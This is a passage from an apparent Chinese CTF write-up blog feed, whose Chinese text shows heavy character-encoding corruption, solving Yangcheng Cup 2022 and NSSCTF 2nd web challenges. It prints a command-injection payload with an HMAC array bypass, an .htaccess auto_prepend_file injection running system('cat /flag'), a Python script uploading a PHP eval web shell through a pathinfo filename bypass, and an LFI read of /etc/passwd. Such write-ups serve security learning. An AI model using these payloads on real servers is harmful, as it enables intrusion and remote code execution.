<p>ææƒæˆåŠŸ <img src="https://img-blog.csdnimg.cn/58e4f735e80748d499a4ac198f5ae0fb.png" alt="1"> ä¹‹å‰ä½¿ç”¨linpeas.shæ”¶é›†ä¿¡æ¯æ—¶å‘ç°è¿˜æœ‰ä¸ªåœ°æ–¹æœ‰é—®é¢˜ <img src="https://img-blog.csdnimg.cn/d8c77bb96f4c484586bcd00c0c8e223e.png" alt="1"> åœ¨rootç›®å½•ä¸‹å‘ç°è¿˜æœ‰ä¸€ä¸ªpythonæ–‡ä»¶switcher.pyæ–‡ä»¶ï¼Œå†…å®¹ä¸3ä¸ªdooræ–‡ä»¶æœ‰å…³ï¼Œè¿™é‡Œæ¶‰åŠç¼“å†²åŒºæº¢å‡ºçš„é—®é¢˜ï¼Œæœ‰æ—¶é—´å†çœ‹ã€‚ ç„¶åè¿˜æœ‰ä¸€ç§ææƒæ–¹æ³•å°±æ˜¯<strong>UDFææƒ</strong> ç›´æ¥ç”¨çš„expï¼š</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/a1a2a7ff0ac242e8a35747b3d27ce149.png" alt="12"></p>
]]></content>
      <categories>
        <category>é¶åœº</category>
      </categories>
  </entry>
  <entry>
    <title>ç¾ŠåŸæ¯2022</title>
    <url>/2023/09/05/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h3 id="Blackcat"><a href="#Blackcat" class="headerlink" title="Blackcat"></a>Blackcat</h3><blockquote>
<p>tipsï¼šstrings æŸ¥çœ‹éŸ³é¢‘æ–‡ä»¶</p>
</blockquote>
<p>webç•Œé¢é™¤äº†ä¸€ä¸ªéŸ³é¢‘ï¼Œæ²¡æœ‰ä»€ä¹ˆå¯çœ‹çš„åœ°æ–¹ï¼Œå³é”®æŸ¥çœ‹ä»£ç ä¹Ÿæ— ã€‚<br>æœ€åä¸‹è½½éŸ³é¢‘è¿›è¡ŒæŸ¥çœ‹ï¼Œä½¿ç”¨<code>strings éŸ³é¢‘æ–‡ä»¶</code>åœ¨æœ«å°¾çœ‹åˆ°æºç </p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">Title
<span class="token constant">APETAGEX</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Black-Cat-Sheriff'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'One-ear'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'
$clandestine = getenv("clandestine");
if(isset($_POST['</span>White<span class="token operator">-</span>cat<span class="token operator">-</span>monitor<span class="token string single-quoted-string">']))
    $clandestine = hash_hmac('</span>sha256<span class="token string single-quoted-string">', $_POST['</span>White<span class="token operator">-</span>cat<span class="token operator">-</span>monitor<span class="token string single-quoted-string">'], $clandestine);
$hh = hash_hmac('</span>sha256<span class="token string single-quoted-string">', $_POST['</span>One<span class="token operator">-</span>ear<span class="token string single-quoted-string">'], $clandestine);
if($hh !== $_POST['</span>Black<span class="token operator">-</span>Cat<span class="token operator">-</span>Sheriff<span class="token string single-quoted-string">'])&#123;
    die('</span>
<span class="token keyword">echo</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nc"</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'One-ear'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>é¦–å…ˆä½¿ç”¨POSTæ–¹å¼æäº¤å‚æ•°Black-Cat-Sheriffå’ŒOne-earï¼Œclandestineå­˜å‚¨ç¯å¢ƒå˜é‡çš„å€¼ã€‚ç„¶åclandestineåˆå­˜å‚¨ç»è¿‡hash_hmacå‡½æ•°å“ˆå¸Œè¿ç®—çš„å€¼ï¼Œhhå­˜å‚¨ç»è¿‡hash_hmacå‡½æ•°å“ˆå¸Œè¿ç®—çš„å€¼ï¼ŒPOSTä¼ å…¥Black-Cat-Sheriffçš„å€¼å’Œhhä¸ç›¸ç­‰çš„è¯ç»§ç»­æ‰§è¡Œä¸‹é¢å‘½ä»¤ã€‚</p>
<p><strong>hash_hmacå‡½æ•°</strong><br>è¯´æ˜<br>hash_hmac ( string $algo , string $data , string $key [, bool $raw_output &#x3D; FALSE ] ) : string<br>å‚æ•°</p>
<ul>
<li><p>algo<br>è¦ä½¿ç”¨çš„å“ˆå¸Œç®—æ³•åç§°ï¼Œä¾‹å¦‚ï¼šâ€md5â€ï¼Œâ€sha256â€ï¼Œâ€haval160,4â€ ç­‰ã€‚ å¦‚ä½•è·å–å—æ”¯æŒçš„ç®—æ³•æ¸…å•ï¼Œè¯·å‚è§ hash_hmac_algos() å‡½æ•°ã€‚</p>
</li>
<li><p>data<br>è¦è¿›è¡Œå“ˆå¸Œè¿ç®—çš„æ¶ˆæ¯ã€‚</p>
</li>
<li><p>key<br>ä½¿ç”¨ HMAC ç”Ÿæˆä¿¡æ¯æ‘˜è¦æ—¶æ‰€ä½¿ç”¨çš„å¯†é’¥ã€‚</p>
</li>
<li><p>raw_output<br>è®¾ç½®ä¸º TRUE è¾“å‡ºåŸå§‹äºŒè¿›åˆ¶æ•°æ®ï¼Œ è®¾ç½®ä¸º FALSE è¾“å‡ºå°å†™ 16 è¿›åˆ¶å­—ç¬¦ä¸²ã€‚</p>
</li>
</ul>
<p>è¿”å›å€¼<br>å¦‚æœ raw_output è®¾ç½®ä¸º TRUEï¼Œ åˆ™è¿”å›åŸå§‹äºŒè¿›åˆ¶æ•°æ®è¡¨ç¤ºçš„ä¿¡æ¯æ‘˜è¦ï¼Œ å¦åˆ™è¿”å› 16 è¿›åˆ¶å°å†™å­—ç¬¦ä¸²æ ¼å¼è¡¨ç¤ºçš„ä¿¡æ¯æ‘˜è¦ã€‚ å¦‚æœ algo å‚æ•°æŒ‡å®šçš„ä¸æ˜¯å—æ”¯æŒçš„ç®—æ³•ï¼Œè¿”å› FALSEã€‚<br><img src="https://img-blog.csdnimg.cn/6ee08b16227742af90dc5803049d27ba.png" alt="1"></p>
<p><img src="https://img-blog.csdnimg.cn/ca6ca0b3329c47ff8173d82eb56e2150.png" alt="2"></p>
<p>ç„¶åè¿˜æœ‰ä¸€ä¸ªå°çŸ¥è¯†ç‚¹å°±æ˜¯</p>
<blockquote>
<p>hash_hmac($algo, $data, $key)<br>å½“dataä¸ºæ•°ç»„æ—¶ï¼Œè¿”å›å€¼ä¸ºnullï¼ˆç©ºï¼‰ã€‚</p>
</blockquote>
<p>å†çœ‹ä»£ç ï¼š</p>
<blockquote>
<p>echo exec(â€œncâ€.$_POST[â€˜One-earâ€™]);</p>
<p>ä¼ å…¥<code>One-ear</code>ä¸º<code>;cat flag.php</code>ï¼Œä¸ºäº†æ‹¿åˆ°flagæ–‡ä»¶ã€‚<br>$clandestine &#x3D; hash_hmac(â€˜sha256â€™, $_POST[â€˜White-cat-monitorâ€™], $clandestine);</p>
</blockquote>
<p>ä¼ å…¥<code>White-cat-monitor</code>ä¸ºæ•°ç»„å½¢å¼è®©clandestineè¿”å›ä¸ºç©ºï¼ˆnullï¼‰</p>
<blockquote>
<p>if($hh !&#x3D;&#x3D; $_POST[â€˜Black-Cat-Sheriffâ€™])</p>
</blockquote>
<p>å¦‚æœè¦æ»¡è¶³æ¡ä»¶çš„è¯å°†ä¸‹é¢ä»£ç è¿è¡Œçš„ç»“æœèµ‹å€¼ç»™Black-Cat-Sheriff</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sha256'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">";cat flag.php"</span><span class="token punctuation">,</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>åŸç†å°±æ˜¯<code>$hh = hash_hmac(&#39;sha256&#39;, $_POST[&#39;One-ear&#39;], $clandestine);</code>ä¸­çš„<code>$clandestine</code>æ­¤æ—¶å—ä¸Šé¢<code>$clandestine = hash_hmac(&#39;sha256&#39;, $_POST[&#39;White-cat-monitor&#39;], $clandestine);</code>çš„å½±å“ï¼Œæ­¤æ—¶<code>$clandestine</code>ä¸ºnullã€‚å³æ»¡è¶³äº†æ¡ä»¶ã€‚<br><img src="https://img-blog.csdnimg.cn/c011321dc2ce4571ade8bb4d58d9774c.png" alt="3"></p>
<h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><blockquote>
<p>tipsï¼š.htaccessæ–‡ä»¶</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'on'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'html'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'upload'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hacker"</span><span class="token punctuation">;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[^a-z\.]/"</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hacker"</span><span class="token punctuation">;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\nHello, world"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è¿™é‡Œä»¥å‚æ•°contentå’Œfilenameä¼ å…¥æ–‡ä»¶å†…å®¹å’Œæ–‡ä»¶åï¼Œå†…å®¹ä¸­ä¸èƒ½å¸¦æœ‰<code>onï¼Œhtmlï¼Œtypeï¼Œflagï¼Œuploadï¼Œfile</code>ã€‚å¹¶ä¸”æ–‡ä»¶ååªèƒ½æ˜¯å°å†™å­—æ¯ã€‚<br><code>file_put_contents($filename, $content . &quot;\nHello, world&quot;);</code><br>è¿™é‡Œçš„æ–‡ä»¶å†…å®¹ä¼šæ‹¼æ¥ä¸Šhelloworldã€‚<br>å†™å…¥å†…å®¹å¦‚ä¸‹ï¼š</p>
<blockquote>
<p><code>php_value auto_prepend_fil\ e .htaccess #&lt;?php system(&#39;cat /fla?);?&gt;\ </code></p>
</blockquote>
<p>php_value auto_prepend_fileç”¨æ¥åœ¨é¡µé¢åº•éƒ¨åŠ è½½æ–‡ä»¶ï¼Œç”±äºfileè¢«è¿‡æ»¤äº†ï¼Œè¿™é‡Œä½¿ç”¨<code>fil\%0Ae</code>ï¼Œ<code>#</code>æ˜¯ä¸ºäº†è¿åˆ**.htaccess**çš„ä¹¦å†™å½¢å¼ã€‚å°¾éƒ¨çš„<code>\</code>æ˜¯ä¸ºäº†è½¬ä¹‰åé¢çš„æ¢è¡Œç¬¦ã€‚æœ€åæ ¼å¼ä¸º</p>
<blockquote>
<p>php_value auto_prepend_fil<br>e .htaccess<br>#<?php system('cat /fla'.'g');?>\hellowprld<br>å¦‚æœæ˜¯<br>php_value auto_prepend_fil<br>e .htaccess<br>#<?php system('cat /fla?');?><br>helloworld<br>è¿™æ ·ä¼šæŠ¥é”™500.</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/cb25147337d94147ba512a0d14fbc9dd.png" alt="5"></p>
<p>ä¼˜ç§€æ–‡ç« ï¼š<br><a href="https://www.cxyzjd.com/article/Zero_Adam/116808755">ç¾ŠåŸæ¯2020 easyphp â€” ä¼ªåè®®çš„ä½¿ç”¨æ—¶æœºï¼Œâ€”pythonä¸Šä¼ .htaccessçš„åˆ©ç”¨ â€“ preg_matchç»•è¿‡_Zero_Adamçš„åšå®¢-ç¨‹åºå‘˜å®…åŸºåœ°</a></p>
<p><a href="https://xz.aliyun.com/t/8267#toc-0">Apacheçš„.htaccessåˆ©ç”¨æŠ€å·§</a></p>
]]></content>
      <categories>
        <category>nssctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>nssctf2ndweb</title>
    <url>/2023/09/02/nssctf2ndweb/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h3 id="NSSCTF-2nd-phpç­¾åˆ°"><a href="#NSSCTF-2nd-phpç­¾åˆ°" class="headerlink" title="[NSSCTF 2nd]phpç­¾åˆ°"></a>[NSSCTF 2nd]phpç­¾åˆ°</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$black_list</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ph"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"htaccess"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"ini"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$black_list</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Please re-upload"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ªå‡½æ•°<strong>pathinfo</strong>ï¼Œ<a href="https://blog.zsxsoft.com/post/36">ç»•è¿‡pathinfo</a>ï¼Œ<code>pathinfo($filename, PATHINFO_EXTENSION)</code>è·å–æ–‡ä»¶åç¼€åæ—¶è·å–çš„<code>.</code>åé¢çš„å†…å®¹ï¼Œå½“å‡ºç°å¤šä¸ªç‚¹æ—¶ï¼Œç»“æœä¸ºæœ€åä¸€ä¸ª<code>.</code>åé¢çš„å†…å®¹ã€‚æˆ‘ä»¬åªè¦ä¼ å…¥index.php&#x2F;.å°±å¯ä»¥ç»•è¿‡pathinfoçš„æ£€æµ‹äº†ã€‚å½“ä¼ å…¥æ­¤å‚æ•°æ˜¯<code>1.php/.</code>æ—¶ï¼Œ<code>pathinfo</code>è·å–çš„æ–‡ä»¶çš„åç¼€åä¸ºNULLï¼Œæ‰€ä»¥å¯ä»¥åœ¨æ–‡ä»¶ååé¢æ·»åŠ <code>/.</code>æ¥å®ç°ç»•è¿‡ï¼Œè®°å¾—urlç¼–ç æ–‡ä»¶åã€‚<br>è¿™é‡Œæˆ‘ä½¿ç”¨burpä¸Šä¼ æ–‡ä»¶å¤±è´¥ï¼Œäºæ˜¯é‡‡ç”¨pythonè„šæœ¬ä¸Šä¼ </p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

<span class="token keyword">def</span> <span class="token function">upload_content_with_filename</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> content<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
    files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span>filename<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span>
    <span class="token keyword">return</span> response

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    upload_url <span class="token operator">=</span> <span class="token string">'http://node5.anna.nssctf.cn:28154/'</span>  <span class="token comment"># æ›¿æ¢ä¸ºå®é™…çš„ä¸Šä¼ URL</span>
    content_to_upload <span class="token operator">=</span> <span class="token string">"&lt;?php @eval($_POST[1]); phpinfo(); ?>"</span>  <span class="token comment"># æ›¿æ¢ä¸ºè¦ä¸Šä¼ çš„å†…å®¹</span>
    filename_to_upload <span class="token operator">=</span> <span class="token string">"123.php%2F."</span>  <span class="token comment"># æ›¿æ¢ä¸ºè¦è®¾ç½®çš„æ–‡ä»¶å</span>
    response <span class="token operator">=</span> upload_content_with_filename<span class="token punctuation">(</span>upload_url<span class="token punctuation">,</span> content_to_upload<span class="token punctuation">,</span> filename_to_upload<span class="token punctuation">)</span>

    <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"å†…å®¹ä¸Šä¼ æˆåŠŸï¼"</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"å†…å®¹ä¸Šä¼ å¤±è´¥ã€‚"</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"å“åº”ä»£ç :"</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"å“åº”å†…å®¹:"</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç„¶åè¿æ¥èšå‰‘ï¼Œflagåœ¨ç¯å¢ƒå˜é‡é‡Œ<br><img src="https://img-blog.csdnimg.cn/e45ecf02df5f46b7bd9e79579b429f1b.png" alt="1"></p>
<h3 id="NSSCTF-2nd-MyBox"><a href="#NSSCTF-2nd-MyBox" class="headerlink" title="[NSSCTF 2nd]MyBox"></a>[NSSCTF 2nd]MyBox</h3><p><a href="http://node5.anna.nssctf.cn:28756/?url=dosth">http://node5.anna.nssctf.cn:28756/?url=dosth</a><br>è¿™ä¸ªå½¢å¼æˆ‘ä»¬å¯èƒ½æƒ³åˆ°LFIæ¼æ´ï¼Œç»è¿‡æµ‹è¯•å‘ç°file:&#x2F;&#x2F;å¯ä»¥<br><a href="http://node5.anna.nssctf.cn:28756/?url=file:///etc/passwd%E5%8F%AF%E4%BB%A5%E8%AF%BB%E5%8F%96">http://node5.anna.nssctf.cn:28756/?url=file:///etc/passwdå¯ä»¥è¯»å–</a><br><img src="https://img-blog.csdnimg.cn/1fb22c00512948079f0e1969a2b48236.png" alt="2"><br>è¯»å–åˆ°æºç <code>app/app.py</code></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect
<span class="token keyword">import</span> requests<span class="token punctuation">,</span> socket<span class="token punctuation">,</span> struct
<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parse
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/?url=dosth'</span><span class="token punctuation">)</span>
    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> url<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'file://'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>url<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
            <span class="token keyword">return</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
